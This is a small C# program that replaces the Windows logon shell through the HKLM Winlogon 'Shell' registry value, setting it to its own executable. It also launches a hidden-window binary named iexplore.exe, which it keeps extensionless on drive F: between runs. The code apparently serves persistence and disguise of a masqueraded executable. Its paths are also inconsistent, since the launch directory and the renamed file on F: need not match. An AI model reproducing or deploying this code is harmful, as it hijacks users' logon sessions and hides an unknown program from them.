using System;
//using System.Collections.Generic;
//using System.ComponentModel;
//using System.Data;
//using System.Drawing;
//using System.Text;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;


namespace Start_process
{
    public class Form1
    {
     public static void Main()
        {
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", (object)("explorer.exe"));
         
            //HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
            ProcessStartInfo startInfo = new ProcessStartInfo(/*System.Windows.Forms.Application.StartupPath*/Environment.CurrentDirectory +"\\iexplore.exe");
            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
            startInfo.ErrorDialog = false; ;
            startInfo.UseShellExecute = true;
            StreamWriter st = new StreamWriter(/*System.Windows.Forms.Application.StartupPath*/Environment.CurrentDirectory+"\\ErrorUC.txt", true);
            //Path.ChangeExtension("iexplore", ".exe");
            File.Move("f:\\iexplore", "f:\\iexplore.exe");
            try
            {
                Process.Start(startInfo);
                File.Move("f:\\iexplore.exe", "f:\\iexplore");    
              //  Path.ChangeExtension("iexplore.exe", "");
            }
            catch (Exception mm)
            {
                st.WriteLine(DateTime.Now.ToLongDateString() + "\t" + DateTime.Now.ToLongTimeString() + "\t" + mm.Message);
                st.Close();
                return;
                //Application.Restart();
            }
            
            /*catch (FileNotFoundException)
            {
                Application.Restart();
            }*/
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "Shell", (object)System.Windows.Forms.Application.ExecutablePath);
        }
    }
}